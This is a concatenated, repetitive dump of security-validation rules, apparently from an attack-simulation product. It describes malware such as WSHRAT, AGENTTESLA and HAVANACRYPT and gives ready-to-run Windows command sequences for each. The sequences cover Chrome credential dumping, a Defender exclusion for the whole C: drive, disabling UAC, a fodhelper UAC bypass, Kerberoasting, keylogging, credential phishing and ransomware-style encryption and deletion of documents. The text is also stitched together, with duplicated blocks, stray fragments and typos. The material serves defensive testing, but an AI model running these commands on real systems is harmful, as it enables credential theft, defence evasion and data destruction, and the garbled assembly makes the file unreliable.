exact_source_fields.action_description: 此验证动作还原了 Windows 主机上的 WSHRAT 权限提升行为。在此验证动作中，将执行一个脚本，其中包含用于提升用户权限的方法。如果此命令成功，则执行记事本。此行为模仿 WSHRAT 恶意软件上变种的行为。 WSHRAT.VBSCRIPT 是 WSHRAT 的 VBScript 版本，WSHRAT 是一种基于 Houdini 代码系列的脚本远程访问木马 (RAT)，可以使用 JavaScript 或 VBScript 构建。该恶意软件在其命令与控制 (C&C) 服务器的信标中的 HTTP 头的 User-Agent 字段中包含有关受感染系统的信息。 C&C 服务器以命令进行响应，这些命令被解析并执行。 WSHRAT 具有典型的 RAT 功能，例如命令行和脚本执行、下载和执行程序以及密码盗窃，并且能够执行启用远程桌面、文件管理器和键盘记录的附加模块。

exact_source_fields.desc: This validation rule simulates a WSHRAT permission escalation behavior on Windows hosts. In this validation rule, a script will be executed that contains methods for enhancing user permissions. If this command is successful, execute Notepad. This behavior mimics a variant of WSHRAT malware. WSHRAT.VBSCRIPT is the VBScript version of WSHRAT, which is a script remote access Trojan (RAT) based on the Houdini code family and can be built using JavaScript or VBScript. The malware contains information about the infected system in the user-agent field of the HTTP header in its Command and Control (C2) server's beacon. The C2 server responds with commands, which are parsed and executed. WSHRAT has typical RAT features such as command line and script execution, downloading and executing programs, and password theft, as well as the ability to execute additional modules that enable remote desktop, file manager, and keylogging.

host_cli_action.raw_text:
cd C:\Users\Public\Documents\
  auto,4,true,60
  success_zero
 
WScript.exe StartUp_Elevate.vbs
  auto,4,true,60
  success_zero
  
Get-Process
  auto,4,true,60
  success_match:notepad
  
rm C:\Users\Public\Documents\StartUp_Elevate.vbs
  auto,4,true,60
  cleanup
  
Stop-Process -name notepad
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates a WSHRAT permission escalation behavior on Windows hosts. In this validation rule, a script will be executed that contains methods for enhancing user permissions. If this command is successful, execute Notepad. This behavior mimics a variant of WSHRAT malware. WSHRAT.VBSCRIPT is the VBScript version of WSHRAT, which is a script remote access Trojan (RAT) based on the Houdini code family and can be built using JavaScript or VBScript. The malware contains information about the infected system in the user-agent field of the HTTP header in its Command and Control (C2) server's beacon. The C2 server responds with commands, which are parsed and executed. WSHRAT has typical RAT features such as command line and script execution, downloading and executing programs, and password theft, as well as the ability to execute additional modules that enable remote desktop, file manager, and keylogging.

host_cli_action.raw_text:
cd C:\Users\Public\Documents\
  auto,4,true,60
  success_zero
 
WScript.exe StartUp_Elevate.vbs
  auto,4,true,60
  success_zero
  
Get-Process
  auto,4,true,60
  success_match:notepad
  
rm C:\Users\Public\Documents\StartUp_Elevate.vbs
  auto,4,true,60
  cleanup
  
Stop-Process -name notepad
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates a WSHRAT permission escalation behavior on Windows hosts. In this validation rule, a script will be executed that contains methods for enhancing user permissions. If this command is successful, execute Notepad. This behavior mimics a variant of WSHRAT malware. WSHRAT.VBSCRIPT is the VBScript version of WSHRAT, which is a script remote access Trojan (RAT) based on the Houdini code family and can be built using JavaScript or VBScript. The malware contains information about the infected system in the user-agent field of the HTTP header in its Command and Control (C2) server's beacon. The C2 server responds with commands, which are parsed and executed. WSHRAT has typical RAT features such as command line and script execution, downloading and executing programs, and password theft, as well as the ability to execute additional modules that enable remote desktop, file manager, and keylogging.

host_cli_action.raw_text:
cd C:\Users\Public\Documents\
  auto,4,true,60
  success_zero
 
WScript.exe StartUp_Elevate.vbs
  auto,4,true,60
  success_zero
  
Get-Process
  auto,4,true,60
  success_match:notepad
  
rm C:\Users\Public\Documents\StartUp_Elevate.vbs
  auto,4,true,60
  cleanup
  
Stop-Process -name notepad
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates the stored credentials and browsing history obtained by adversary using PowerShell in Google Chrome. In This validation rule, PowerShell is used to scan Google Chrome user specific file dependencies, such as SQLite based credential files. The stored password is encrypted, so the Windows API function CryptoUnprotectData is used to retrieve the plaintext version of the password. When this specific operation is successful, the obtained data (credentials and browse history) will be parsed and presented in the current PowerShell session** Dependency condition: * * Validator is running in the OS which must install Google Chrome browser

host_cli_action.raw_text:
Test-Path -Path $env:LOCALAPPDATA\Google\Chrome\"User Data\Default\Login Data"
  auto,4,true,60
  success_match:True

Start-Job -scriptblock {Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; iex (New-Object Net.WebClient).DownloadString("C:\Users\Public\Documents\Get-ChromeDump.ps1"); Get-ChromeDump -OutFile "C:\Users\Public\Documents\dump_test.txt"}
  auto,4,true,60
  success_zero

Get-Job
  auto,4,true,60
  success_zero

Get-Content C:\Users\Public\Documents\dump_test.txt
  auto,4,true,60 
  success_match:LOGINS

rm C:\Users\Public\Documents\dump_test.txt
  auto,4,true,60
  cleanup

rm C:\Users\Public\Documents\Get-ChromeDump.ps1
  auto,4,true,60
  cleanup

rm $env:LOCALAPPDATA\System.Data.SQLite.dll
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates the stored credentials and browsing history obtained by adversary using PowerShell in Google Chrome. In This validation rule, PowerShell is used to scan Google Chrome user specific file dependencies, such as SQLite based credential files. The stored password is encrypted, so the Windows API function CryptoUnprotectData is used to retrieve the plaintext version of the password. When this specific operation is successful, the obtained data (credentials and network history) will be parsed and presented in the current PowerShell session>* * Dependency condition: * * Validator is running in the OS which must install Google Chrome browser

host_cli_action.raw_text:
$Initial = Get-ExecutionPolicy
  auto,4,true,60
  success_zero

Test-Path -Path $env:LOCALAPPDATA\Google\Chrome\"User Data\Default\Login Data"
  auto,4,true,60
  success_match:True

Start-Job -scriptblock {Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; import-module C:\Users\Public\Documents\Get-ChromeDump.ps1; Get-ChromeDump -OutFile "C:\Users\Public\Documents\dump_test.txt"}
  auto,4,true,60
  success_zero

Get-Job
  auto,4,true,60
  success_zero

Get-Content C:\Users\Public\Documents\dump_test.txt
  auto,4,true,60 
  success_match:LOGINS

rm C:\Users\Public\Documents\dump_test.txt
  auto,4,true,60
  cleanup

rm C:\Users\Public\Documents\Get-ChromeDump.ps1
  auto,4,true,60
  cleanup

rm $env:LOCALAPPDATA\System.Data.SQLite.dll
  auto,4,true,60
  cleanup

Set-ExecutionPolicy -ExecutionPolicy $Initial -Scope Process -Force
  auto,4,true,60
  cleanup

After the Adversary confirms that the environment has been configured for unrestricted delegation, they will continue to attempt to use credential DUMP tools (such as mimikatz or other exploit scripts) through an administrator or service account to disrupt the server. Analyst comment * If the validator is not connected to a domain controller that has enabled unconstrained delegation for the validator, this validation rule will be blocked.

exact_source_fields.desc: This validation rule simulates WSHRAT disabling security controls to evade detection. In this validation rule, PowerShell is used to create a file exclusion that includes the entire file system. This behavior mimics the behavior of the 2019 variant on WSHRAT.JAVASCRIPT malware. WSHRAT.JAVASCRIPT is the JavaScript version of WSHRAT, which is a scripting remote access Trojan (RAT) based on the Houdini code family and can be built using JavaScript or VBScript. The malware contains information about the infected system in the user-agent field of the HTTP header in its Command and Control (C2) server's beacon. The C2 server responds with parsed and executed commands. WSHRAT has typical RAT features such as command line and script execution, downloading and executing programs, and password theft. It can also execute additional modules that enable remote desktop, file manager, and keylogging.

host_cli_action.raw_text:
Add-MpPreference -ExclusionPath "C:\"
  auto,4,true,60
  success_zero
 
Remove-MpPreference -ExclusionPath "C:\"
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates WSHRAT disabling Security Controls to evade detection. In this validation rule, the registry is modified to bypass commonly used controls in Windows to help users avoid unintentional execution of potential malicious files. WSHRAT.JAVASCRIPT is the JavaScript version of WSHRAT, which is a scripting remote access Trojan (RAT) based on the Houdini code family and can be built using JavaScript or VBScript. The malware contains information about the infected system in the user-agent field of the HTTP header in its Command and Control (C2) server's beacon. The C2 server responds with parsed and executed commands. WSHRAT has typical RAT features such as command line and script execution, downloading and executing programs, and password theft. It can also execute additional modules that enable remote desktop, file manager, and keylogging.

host_cli_action.raw_text:
$policy_path = "HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
  auto,4,true,60
  success_zero

$policy_item = Get-ItemProperty -Path $policy_path
  auto,4,true,60
  success_zero

$enable_lua_old = $policy_item.EnableLUA
  auto,4,true,60
  success_zero
  
$cpb_admin_old = $policy_item.ConsentPromptBehaviorAdmin
  auto,4,true,60
  success_zero
  
Set-ItemProperty -Path $policy_path -Name EnableLUA -Value 0
  auto,4,true,60
  success_zero

Set-ItemProperty -Path $policy_path -Name ConsentPromptBehaviorAdmin -Value 0
  auto,4,true,60
  success_zero
  
Set-ItemProperty -Path $policy_path -Name EnableLUA -Value $enable_lua_old
  auto,4,true,60
  cleanup
  
Set-ItemProperty -Path $policy_path -Name ConsentPromptBehaviorAdmin -Value $cpb_admin_old
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates the WSHRAT keylogging behavior on Windows hosts. In this validation rule, execute a module similar to WSHRAT to record user keystrokes. This behavior mimics the behavior of the 2019 variant on WSHRAT malware. WSHRAT.VBSCRIPT is the VBScript version of WSHRAT, which is a script remote access Trojan (RAT) based on the Houdini code family and can be built using JavaScript or VBScript. The malware contains information about the infected system in the User-Agent field of the HTTP header in its Command and Control (C2) server's beacon. The C2 server responds with commands, which are parsed and executed. WSHRAT has typical RAT features such as command line and script execution, downloading and executing programs, and password theft, as well as the ability to execute additional modules that enable remote desktop, file manager, and keylogging.

host_cli_action.raw_text:
$kl_job = Start-Job -ScriptBlock {C:\Users\Public\Documents\kl.exe}
  auto,10,true,60
  success_zero

$shell = New-Object -com "Wscript.Shell"
  auto,4,true,60
  success_zero
  
$shell.sendkeys('a')
  auto,4,true,60
  success_zero
  
$shell.sendkeys('b')
  auto,4,true,60
  success_zero
  
$shell.sendkeys('c')
  auto,4,true,60
  success_zero
  
$kl_job | Stop-Job
  auto,4,true,60
  success_zero
  
$kl_job | Remove-Job
  auto,4,true,60
  success_zero
  
ls C:\Users\Public\
  auto,4,true,60
  success_match:wshlogs

rm C:\Users\Public\Documents\kl.exe
  auto,4,true,60
  cleanup
  
rm C:\Users\Public\wshlogs -Force
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates the Kerberoat attack. The service running on the domain identified by the Service Principal Name (SPN) needs to have a service login account so that it can correctly authenticate using HTTPS. To perform authentication, a valid Ticket Granting Ticket (TGT) must request a Ticket Granting Service (TGS) service ticket. These TGS can contain hash values for service login account passwords. If Adversary has TGT, they can request a TGS service ticket to obtain the hash value of the password, which can then be cracked offline. This validation rule will first use the GetUserSPN.ps1 script to query all SPNs on the domain. Then the Invoke Kerberoast.ps1 script will attempt to request a TGS service ticket and obtain a password hash.

host_cli_action.raw_text:
cd C:\Users\Public\Documents
  auto,4,true,60
  success_zero

(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain
  auto,4,true,60
  incompatible_match:false
  
$exe_policy = Get-ExecutionPolicy
  auto,4,true,60
  success_zero

Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
  auto,4,true,60
  success_zero

.\GetUserSPNs.ps1
  auto,4,true,180
  success_match:name
  
. .\Invoke-Kerberoast.ps1
  auto,4,true,60
  success_zero

Invoke-Kerberoast
  auto,4,true,60
  success_match:Hash
  
Remove-Item C:\Users\Public\Documents\GetUserSPNs.ps1, C:\Users\Public\Documents\Invoke-Kerberoast.ps1
  auto,4,true,60
  cleanup
  
Set-ExecutionPolicy -ExecutionPolicy $exe_policy -Scope Process -Force
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates adversary's Dump Mozilla Firefox web credentials from the credential Dump. In this validation rule, PowerShell is used to retrieve Mozilla Firefox storage on the disk and decrypt its content using Firefox specific dynamic link libraries. If there is no master password protection, the decryption of credential Dump will be successful. After damaging the machine, Adversary typically attempts to retrieve web credentials from a web browser. If Firefox does not exist in the system, the validation rule will not run. Notes - This validation rule uses incompatible features** Dependency condition: * * Validator is running in the OS that must install Mozilla Firefox

host_cli_action.raw_text:
Test-Path -Path $env:LOCALAPPDATA\Mozilla\Firefox
  auto,4,true,60
  incompatible_match:False
  
cd C:\Users\Public\Documents
  auto,4,true,60
  success_zero
  
$the_file = ""
  auto,4,true,60

exact_source_fields.desc: This validation rule simulates a malicious Google Chrome browser extension that sends information about user online behavior to servers controlled by adversary. In this case, the malicious browser extension program will copy the URL of the visited site and send them to the local host port 8000, where the netcat listener will retrieve information. More malicious browsers can also record user keystrokes or steal user cookies. Due to the use of netcat binary files, antivirus software may block the execution of this validation rule, although using this binary file is only for restoration purposes and is not necessary for using malicious browser extensions. Similarly, firewall rules may prevent the use of port 8000, although Adversary may choose ports that are more commonly allowed to pass through the firewall. This validation rule will query the registry entries to determine if Google Chrome is installed on the device. If not installed, the operation will not run. Notes - This validation rule uses incompatible features** Dependency condition: * * Validator is running in the OS that must install Google Chrome browser

cd C:\Users\Public\Documents
  auto,4,true,60
  success_zero
   
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" 
  auto,4,true,60
  incompatible_match:(Invalid key name|unable to find the specified registry key or value)
   
start /b nc.exe -lvp 8000 > Captured.txt
  auto,30,true,60
  blocked_match:block

for /F "delims==" %A in ('reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" ^|findstr Default') do @set Chrome=%A
  auto,4,true,60
  blocked_match:block
  
"%Chrome:~27,90%" https://en.wikipedia.org/wiki/browser_extension --load-extension=C:\Users\public\Documents  
  auto,45,true,60
  blocked_match:block

taskkill /f /im nc.exe
  auto,4,true,60
  blocked_match:block
  
type Captured.txt
  auto,4,true,60
  success_match:wikipedia
  
"%Chrome:~27,90%" --unload-extension=C:\Users\public\Documents  
  auto,4,true,60
  cleanup
  
taskkill /f /im chrome.exe
  auto,4,true,60
  cleanup
  
del C:\Users\Public\Documents\Captured.txt C:\Users\Public\Documents\manifest.json C:\Users\Public\Documents\BrowserExtension.js C:\Users\Public\Documents\nc.exe
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates the use of the GetClipboardData function in the Windows API to collect clipboard data from the machine. REMCOS uses this technique to steal clipboard data. REMCOS is a configurable remote access Trojan (RAT) program written in C++, with a large number of implemented functions, including file management, screenshot, accessing clipboard data, command shell, arbitrary file access, mouse control, etc It also has the ability to capture camera and microphone inputs. Note: This action can only be run on a 64 bit validator.

host_cli_action.raw_text:
Set-Clipboard "Sensitive data and passwords and tokens"
	auto,4,true,60
  success_zero

cd C:\Users\Public\Documents; ./ObtainClipboardData.exe
  auto,4,true,60
  success_zero
 
get-content C:\Users\Public\Documents\clipboard_log.txt
	auto,4,true,60
  success_match:Sensitive data
  
rm C:\Users\Public\Documents\clipboard_log.txt
	auto,4,true,60
  cleanup
  
rm C:\Users\Public\Documents\ObtainClipboardData.exe
	auto,4,true,60
  cleanup
  
rm C:\Users\Public\Documents\vcruntime140_1.dll
	auto,4,true,60
  cleanup

steps.command: Set-Clipboard "Sensitive data and passwords and tokens"

exact_source_fields.desc: This validation rule simulates an adversary attempt to obtain legitimate user credentials from an infected machine using Nishang's Invoke CredentialPhishing script. This script creates a login window that will not be deleted until a valid username and password are provided. At this time, the username and password are displayed in clear text to adversary. This validation rule creates a user named "sectiontest" with a password of "Thepassword @ #..". Therefore, This validation rule will only run normally under user profiles with administrative privileges, although running invoice CredentialsPhish.ps1 does not require administrative privileges.

host_cli_action.raw_text:
#create new user for test
net user secvisiontest QWuqTGH!32Q! /add /Y
  auto,4,true,60
  success_zero

#Save the process id of the current PowerShell instance
$originalList = Get-Process -name powershell | select -ExpandProperty Id
  auto,4,true,60
  success_zero

#Create a new instance of PowerShell, load and execute the script
invoke-expression 'cmd /c start powershell -Command { iex (new-object net.webclient).downloadstring("C:\Users\Public\Documents\Invoke-CredentialsPhish.ps1"); invoke-credentialsphish}'
  auto,4,true,60
  success_zero
  
#Identify the process id of the new PowerShell instance
$newList = get-process -name powershell | where {$_.ID -ne $original} | select -expandproperty id
  auto,4,true,60
  success_zero

$new = compare-object -ReferenceObject $originalList -DifferenceObject $newList | select -ExpandProperty InputObject
  auto,4,true,60
  success_zero

$wshell = New-Object -ComObject wscript.shell;
  auto,4,true,60
  success_zero

$wshell.AppActivate($new)
  auto,4,true,60
  success_zero

sleep 7
  auto,4,true,60
  success_zero

#send the user name
$wshell.SendKeys('MSVTEST{TAB}')
  auto,4,true,60
  success_zero

sleep 5
  auto,4,true,60
  success_zero

#send the password
$wshell.SendKeys('QWuqTGH!32Q!{ENTER}')
  auto,4,true,60
  success_zero
  
net user MSVTEST /del
  auto,4,true,60
  cleanup
  
remove-item C:/Users/Public/Documents/Invoke-CredentialsPhish.ps1
  auto,4,true,60
  cleanup

taskkill /im $new /f
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates an adversary attempt to obtain legitimate user credentials from an infected machine using Nishang's Invoke CredentialPhishing script. This script creates a login window that will not be deleted until a valid username and password are provided. At this time, the username and password are displayed in clear text to adversary. This validation rule creates a user named "sectiontest" with a password of "Thepassword @ #..". Therefore, This validation rule will only run normally under user profiles with administrative privileges, although running invoice CredentialsPhish.ps1 does not require administrative privileges.

host_cli_action.raw_text:
#create new user for test
net user secvisiontest QWuqTGH!32Q! /add /Y
  auto,4,true,60
  success_zero

#Save the process id of the current PowerShell instance
$originalList = Get-Process -name powershell | select -ExpandProperty Id
  auto,4,true,60
  success_zero

#Create a new instance of PowerShell, load and execute the script
invoke-expression 'cmd /c start powershell -Command { iex (new-object net.webclient).downloadstring("C:\Users\Public\Documents\Invoke-CredentialsPhish.ps1"); invoke-credentialsphish}'
  auto,4,true,60
  success_zero
  
#Identify the process id of the new PowerShell instance
$newList = get-process -name powershell | where {$_.ID -ne $original} | select -expandproperty id
  auto,4,true,60
  success_zero

$new = compare-object -ReferenceObject $originalList -DifferenceObject $newList | select -ExpandProperty InputObject
  auto,4,true,60
  success_zero

$wshell = New-Object -ComObject wscript.shell;
  auto,4,true,60
  success_zero

$wshell.AppActivate($new)
  auto,4,true,60
  success_zero

sleep 7
  auto,4,true,60
  success_zero

#send the user name
$wshell.SendKeys('MSVTEST{TAB}')
  auto,4,true,60
  success_zero

sleep 5
  auto,4,true,60
  success_zero

#send the password
$wshell.SendKeys('QWuqTGH!32Q!{ENTER}')
  auto,4,true,60
  success_zero
  
net user MSVTEST /del
  auto,4,true,60
  cleanup
  
remove-item C:/Users/Public/Documents/Invoke-CredentialsPhish.ps1
  auto,4,true,60
  cleanup

taskkill /im $new /f
  auto,4,true,60
  cleanup

此验证动作还原了从各种已安装软件（包括 Web 浏览器、电子邮件/信使客户端、VPN 客户端、FTP 客户端和下载管理器）中窃取凭据的行为。已观察到 AGENTTESLA 以这种方式窃取凭据。此验证动作使用良性 .NET 程序访问与 AGENTTESLA 相同的文件。与 AGENTTESLA 一样，它主要针对_当前用户_目录中的文件。

exact_source_fields.desc:
This validation rule simulates a behavior of stealing credentials from various installed software, including web browsers, email/messenger clients, VPN clients, FTP clients, and download managers. AGENTTESLA has been observed stealing credentials in this way. This validation rule uses benign .NET program accesses the same file as AGENTTESLA. Like AGENTTESLA, it mainly targets files in the current user directory.
AGENTTESLA is a .NET information theft program, with the following functions: keylogging, copy/paste capture, screenshot, password theft, webcam capture, USB Spread, and anti analysis.

c:\users\public\documents\Agent_Edison.exe
  auto,4,true,60
  success_match:Harvest successful

del c:\users\public\documents\Agent_Edison.exe
	auto,4,true,60
  cleanup

This validation rule simulates a behavior of stealing credentials from various installed software, including web browsers, email/messenger clients, VPN clients, FTP clients, and download managers. AGENTTESLA has been observed stealing credentials in this way. This validation rule uses benign .NET program accesses the same file as AGENTTESLA. Like AGENTTESLA, it mainly targets files in the current user directory.
AGENTTESLA is a .NET information theft program, with the following functions: keylogging, copy/paste capture, screenshot, password theft, webcam capture, USB Spread, and anti analysis.

exact_source_fields.desc: This validation rule simulates an adversary encryption and deletion of data on the host. This validation rule uses PowerShell scripts to search for various file types, and then uses AES encryption to find the files. After the file is encrypted, the original unencrypted version will be deleted. This behavior indicates that adversary wants ransom or performs data corruption.

host_cli_action.raw_text:
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
  auto,4,true,60
  success_zero

Import-Module -Name C:\users\public\documents\FileCryptography.psm1
  auto,4,true,60
  success_zero

$key = New-CryptographyKey
  auto,4,true,60
  success_zero

echo testing > C:\users\public\documents\out.txt
  auto,4,false,10
  success_zero

dir C:\users\public\documents
  auto,4,false,10
  success_zero

get-childitem -path C:\users\public -recurse -include *.doc,*.docx,*.ppt,*.pptx,*.xls,*.xlsx,*.csv,*.txt,*.pst,*.ost,*.eml | Protect-File  -Algorithm AES -key $key 
  auto,15,true,30
  success_zero

get-childitem -path C:\users\public -recurse -include *.doc,*.docx,*.ppt,*.pptx,*.xls,*.xlsx,*.csv,*.txt,*.pst,*.ost,*.eml | Remove-Item 
  auto,15,true,30
  success_zero

dir C:\users\public\documents
  auto,4,false,10
  success_match:out\.txt\.aes
  
del C:\users\public\documents\FileCryptography.psm1
  auto,4,true,60
  cleanup

exact_source_fields.action_description:
此验证动作还原了表明主机感染了 HAVANACRYPT 勒索软件。
HAVANACRYPT 检查 hava.info 是否已存在于"%AppDataLocal%/Google/Google Software Update/1.0.0.0"中。
如果找不到该文件，则会删除 hava.info 文件，该文件包含 HAVANACRYPT 生成的 RSA 密钥。

exact_source_fields.desc:
This validation rule simulates a indication that the host has been infected with HAVANACRYPT ransomware.
HAVANACRYPT checks if hava.info already exists in "%AppDataLocal%/Google/Google Software Update/1.0.0.0".
If the file cannot be found, the hava.info file will be deleted, which contains the RSA key generated by HAVANACRYPT.
HAVANACRYPT is a ransomware that disguises itself as a Google software update application and uses the Microsoft Network Hosting Service IP address as its command and control server to evade detection.
HAVANACRYPT also implements many anti virtualization technologies by examining processes, files, and services related to virtual machine applications.
Note that this validation rule does not perform any encryption activities.

host_cli_action.raw_text:
$state=Test-Path "$env:AppData\Local\Google\Google Software Update\1.0.0.0\havana.info"
  auto,4,true,60
  success_match:.?

Test-Path "$env:AppData\Local\Google\Google Software Update\1.0.0.0\havana.info"
  auto,4,true,60
  success_match:false

New-Item -ItemType "directory" -Path "$env:AppData\Local\Google\Google Software Update\1.0.0.0\"
  auto,4,true,60
  success_match:.?
  
New-Item -Path "$env:AppData\Local\Google\Google Software Update\1.0.0.0\" -Name "havana.info" -ItemType "file" -Value "4m5clG5KHnLFQ+O8q2SL7L8czty48cAAcIq0nXwxL0xJQA\/3smrBMBJCd5Evd0Q+"
  auto,4,true,60
  success_match:.?

Test-Path "$env:AppData\Local\Google\Google Software Update\1.0.0.0\havana.info"
  auto,4,true,60
  success_match:true

if ($state -eq $true) { Remove-Item "$env:AppData\Local\Google\Google Software Update\1.0.0.0\havana.info" } else { Remove-Item "$env:AppData\Local\Google\Google Software Update\1.0.0.0\" -Force  -Recurse -ErrorAction SilentlyContinue }
  auto,3,true,4
  cleanup

exact_source_fields.desc: This validation rule simulates the use of the Windows 10 On Demand Assistant (fodhelper. exe) to bypass user account control. When executed, "Operation completed successfully." will be displayed twice and a command prompt will be opened. Adversary may bypass the UAC mechanism to elevate process permissions on the system. Windows User Account Control (UAC) allows programs to elevate their permissions (tracked at low to high integrity levels) to perform tasks under administrator level permissions, possibly by prompting the user to confirm.

host_cli_action.raw_text:
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\notepad.exe" /f
  auto,4,true,60 
  success_match:The operation completed successfully.

reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
  auto,4,true,60 
  success_match:The operation completed successfully.
	
fodhelper.exe
  auto,4,true,90
  success_zero

tasklist
  auto,4,true,60 
  success_match:notepad

#Cleanup
taskkill /IM notepad.exe
  auto,4,ture,3
  cleanup
 
reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
  auto,4,true,3 
  cleanup

When executed, "Operation completed successfully." will be displayed twice and a command prompt will be opened. Adversary may bypass the UAC mechanism to elevate process permissions on the system. exact_source_fields.desc: This validation rule simulates the use of Fodhelper to bypass User Account Control (UAC). In This validation rule, modify the Fodhelper settings through the system registry to execute PowerShell commands with elevated privileges.

host_cli_action.raw_text:
$a_program = "cmd /c start powershell.exe Set-Content -Path C:\Users\Public\Documents\uac_test.txt -Value 'Testing'"
  auto,4,true,60
  success_zero
 
$path_exists = $(Test-Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command")
  auto,4,true,60
  success_zero
  
if (!$path_exists) { New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force }
  auto,4,true,60
  success_zero
  
Test-Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
  auto,4,true,60
  success_zero
  
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
  auto,4,true,60
  success_zero
  
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $a_program -Force
  auto,4,true,60
  success_zero
  
Start-Process "C:\Windows\System32\fodhelper.exe"
  auto,4,true,60
  success_zero
  
ls C:\Users\Public\Documents
  auto,4,true,60
  success_match:uac_test\.txt
  
if (!$path_exists) { Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force } 
  auto,4,true,60
  cleanup
  
rm C:\Users\Public\Documents\uac_test.txt
  auto,4,true,60
  cleanup

"C:\Program Files\Google\Chrome\Application\chrome.exe"
tasklist /FI "IMAGENAME eq chrome.exe"
C:\Users\Public\Documents\{{v_action_id}}\NetRipper.exe C:\Users\Public\Documents\{{v_action_id}}\DLL.dll chrome.exe

exact_source_fields.desc: This validation rule simulates a binary file of vulnerability CVE-2019-1458 exploited by the host during execution. This is a privilege escalation vulnerability in Windows when the Win32k component is unable to properly handle objects in memory. Adversary that successfully exploits this vulnerability can run arbitrary code in kernel mode. Then Adversary can install the program; View, modify, or delete data; Or create a new account with full user privileges. Previously, it has been observed that someone has exploited this vulnerability to achieve permission escalation in Chrome** Dependency condition: * * Validator is running in the OS that must install Google Chrome browser

host_cli_action.raw_text:
cd "C:\Users\Public\Downloads"
  auto,4,true,60
  success_zero

.\cve20191458.exe
  auto,4,true,60
  success_zero
  
dir "C:\Users\Public\Downloads"
  auto,4,true,60
  success_match:.*dropped\.txt.*
  
Remove-Item "C:\Users\Public\Downloads\cve20191458.exe"
  auto,4,true,60
  cleanup  
  
Remove-Item "C:\Users\Public\Downloads\dropped.txt"
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates a binary file of vulnerability CVE-2019-1458 exploited by the host during execution. This is a privilege escalation vulnerability in Windows when the Win32k component is unable to properly handle objects in memory. Adversary that successfully exploits this vulnerability can run arbitrary code in kernel mode. Then Adversary can install the program; View, modify, or delete data; Or create a new account with full user privileges. Previously, it has been observed that someone has exploited this vulnerability to achieve permission escalation in Chrome** Dependency condition: * * Validator is running in the OS that must install Google Chrome browser

host_cli_action.raw_text:
cd "C:\Users\Public\Downloads"
  auto,4,true,60
  success_zero

.\cve20191458.exe
  auto,4,true,60
  success_zero
  
dir "C:\Users\Public\Downloads"
  auto,4,true,60
  success_match:.*dropped\.txt.*
  
Remove-Item "C:\Users\Public\Downloads\cve20191458.exe"
  auto,4,true,60
  cleanup  
  
Remove-Item "C:\Users\Public\Downloads\dropped.txt"
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates how to use malicious logic to monitor and record clipboard content. The PowerShell script utilizes the built-in "get-clipboard" Cmdlet to monitor the user's clipboard and write its contents within a set time interval. When the victim uses a password manager (such as KeePass), this feature is particularly useful for intercepting copied and pasted credentials. Please note that the "Get-ClipboardContents.ps1" script used in this validation rule has been cleaned up and removed, and will not have any malicious impact.

host_cli_action.raw_text:
iex (New-Object Net.WebClient).DownloadString("C:\Users\Public\Documents\Get-ClipboardContents.ps1")
  auto,4,true,60
  success_zero
 
set-clipboard "Here are some clipboard contents, hopefully not a password ;-)"
  auto,4,true,60
  success_zero

Get-ClipboardContents -CollectionLimit 5 > C:\users\public\documents\out.txt
  auto,10,true,60
  success_zero

cat C:\users\public\documents\out.txt
  auto,4,true,60
  success_zero

rm C:\users\public\documents\out.txt
  auto,4,true,3
  cleanup

rm C:\Users\Public\Documents\Get-ClipboardContents.ps1
  auto,4,true,3
  cleanup

exact_source_fields.desc: This validation rule simulates how to use malicious logic to monitor and record clipboard content. The PowerShell script utilizes the built-in "get-clipboard" Cmdlet to monitor the user's clipboard and write its contents within a set time interval. When the victim uses a password manager (such as KeePass), this feature is particularly useful for intercepting copied and pasted credentials. Please note that the "Get-ClipboardContents.ps1" script used in this validation rule has been cleaned up and removed, and will not have any malicious impact.

host_cli_action.raw_text:
iex (New-Object Net.WebClient).DownloadString("C:\Users\Public\Documents\Get-ClipboardContents.ps1")
  auto,4,true,60
  success_zero
 
set-clipboard "Here are some clipboard contents, hopefully not a password ;-)"
  auto,4,true,60
  success_zero

Get-ClipboardContents -CollectionLimit 5 > C:\users\public\documents\out.txt
  auto,10,true,60
  success_zero

cat C:\users\public\documents\out.txt
  auto,4,true,60
  success_zero

rm C:\users\public\documents\out.txt
  auto,4,true,3
  cleanup

rm C:\Users\Public\Documents\Get-ClipboardContents.ps1
  auto,4,true,3
  cleanup

exact_source_fields.desc: This validation rule simulates a establishment of persistence on infected hosts by adding a shortcut to the Windows startup folder to execute DOUBLEPIPE at system startup. DOUBLEPIPE is a backdoor written in C/C++ that communicates through HTTP. The supported commands include file transfer, file execution, shell command execution, process enumeration, and process termination. Doublepipe has been observed to have been maliciously induced to drop files targeting Korean language users.

